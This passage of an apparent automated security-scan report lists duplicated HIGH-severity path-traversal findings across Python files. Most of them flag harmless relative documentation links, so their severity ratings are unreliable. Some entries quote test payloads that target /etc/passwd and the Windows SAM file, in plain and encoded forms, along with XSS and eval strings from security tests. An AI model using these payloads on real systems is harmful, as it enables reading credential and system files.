            "context": "            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',",
            "context": "            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 31,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "context": "            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            \n            # Within ai_docs corrections",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 31,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "context": "            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            \n            # Within ai_docs corrections",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 31,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "context": "            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            \n            # Within ai_docs corrections",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 31,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "context": "            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            \n            # Within ai_docs corrections",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 34,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',",
            "context": "            \n            # Within ai_docs corrections\n            'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',\n            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 34,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',",
            "context": "            \n            # Within ai_docs corrections\n            'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',\n            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 35,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',",
            "context": "            # Within ai_docs corrections\n            'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',\n            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 35,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',",
            "context": "            # Within ai_docs corrections\n            'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',\n            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 36,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',",
            "context": "            'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',\n            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 36,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',",
            "context": "            'DOCUMENTATION_MINDMAP.md': '../DOCUMENTATION_MINDMAP.md',\n            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 37,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',",
            "context": "            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 37,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',",
            "context": "            '00_AI_DOCS_INDEX.md': '../00_AI_DOCS_INDEX.md',\n            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 38,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',",
            "context": "            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 38,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',",
            "context": "            'UPDATE_SUMMARY_2025-05-30.md': '../UPDATE_SUMMARY_2025-05-30.md',\n            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 39,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',",
            "context": "            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 39,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',",
            "context": "            'DOCUMENTATION_MIGRATION_REPORT.md': '../DOCUMENTATION_MIGRATION_REPORT.md',\n            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 40,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',",
            "context": "            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 40,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',",
            "context": "            'HISTORICAL_TIMELINE_INDEX.md': '../HISTORICAL_TIMELINE_INDEX.md',\n            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 41,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',",
            "context": "            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 41,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',",
            "context": "            '01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md': '../01_INFRASTRUCTURE_AUTOMATION_COMMANDS.md',\n            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 42,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',",
            "context": "            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',\n            'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 42,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',",
            "context": "            '00_MASTER_DOCUMENTATION_INDEX.md': '../00_MASTER_DOCUMENTATION_INDEX.md',\n            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',\n            'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',",
            "context": "            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',\n            'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',",
            "context": "            '02_PERFORMANCE_OPTIMIZATION_PATTERNS.md': '../02_PERFORMANCE_OPTIMIZATION_PATTERNS.md',\n            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',\n            'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',",
            "context": "            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',\n            'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',\n            \n            # Architecture directory fixes",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',",
            "context": "            '03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md': '../03_RUST_PYTHON_INFRASTRUCTURE_INTEGRATION.md',\n            'CROSS_REFERENCE_INDEX.md': '../CROSS_REFERENCE_INDEX.md',\n            'DOCUMENTATION_VALIDATION_REPORT.md': '../DOCUMENTATION_VALIDATION_REPORT.md',\n            \n            # Architecture directory fixes",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 347,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return f'../{original_path}'",
            "context": "        \n        if original_path in parent_candidates:\n            return f'../{original_path}'\n        \n        return original_path",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 347,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return f'../{original_path}'",
            "context": "        \n        if original_path in parent_candidates:\n            return f'../{original_path}'\n        \n        return original_path",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "    ],\n    \"path_traversal\": [\n        \"../../../etc/passwd\",\n        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "    ],\n    \"path_traversal\": [\n        \"../../../etc/passwd\",\n        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "    ],\n    \"path_traversal\": [\n        \"../../../etc/passwd\",\n        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "    ],\n    \"path_traversal\": [\n        \"../../../etc/passwd\",\n        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "    ],\n    \"path_traversal\": [\n        \"../../../etc/passwd\",\n        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "    ],\n    \"path_traversal\": [\n        \"../../../etc/passwd\",\n        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n        \"....//....//....//etc/passwd\",\n        \"..%252f..%252f..%252fetc%252fpasswd\",\n        \"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n        \"....//....//....//etc/passwd\",\n        \"..%252f..%252f..%252fetc%252fpasswd\",\n        \"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n        \"....//....//....//etc/passwd\",\n        \"..%252f..%252f..%252fetc%252fpasswd\",\n        \"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n        \"....//....//....//etc/passwd\",\n        \"..%252f..%252f..%252fetc%252fpasswd\",\n        \"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n        \"....//....//....//etc/passwd\",\n        \"..%252f..%252f..%252fetc%252fpasswd\",\n        \"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "security_audit_test.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "        \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n        \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n        \"....//....//....//etc/passwd\",\n        \"..%252f..%252f..%252fetc%252fpasswd\",\n        \"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "validate_documentation_organization.py",
            "line": 187,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if link_url.startswith('./') or link_url.startswith('../'):",
            "context": "                    \n                    # Resolve relative links\n                    if link_url.startswith('./') or link_url.startswith('../'):\n                        target_path = (md_file.parent / link_url).resolve()\n                    else:",
            "cvss_score": 8.5
          },
          {
            "file": "validate_documentation_organization.py",
            "line": 187,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if link_url.startswith('./') or link_url.startswith('../'):",
            "context": "                    \n                    # Resolve relative links\n                    if link_url.startswith('./') or link_url.startswith('../'):\n                        target_path = (md_file.parent / link_url).resolve()\n                    else:",
            "cvss_score": 8.5
          },
          {
            "file": "setup_mcp_servers_complete.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"path\": f\"../mcp_servers/node_modules/{server['npm_package']}\",",
            "context": "            \"description\": server['description'],\n            \"npm_package\": server['npm_package'],\n            \"path\": f\"../mcp_servers/node_modules/{server['npm_package']}\",\n            \"settings\": server.get('config', {})\n        }",
            "cvss_score": 8.5
          },
          {
            "file": "setup_mcp_servers_complete.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"path\": f\"../mcp_servers/node_modules/{server['npm_package']}\",",
            "context": "            \"description\": server['description'],\n            \"npm_package\": server['npm_package'],\n            \"path\": f\"../mcp_servers/node_modules/{server['npm_package']}\",\n            \"settings\": server.get('config', {})\n        }",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"Path: ../../../etc/passwd\",",
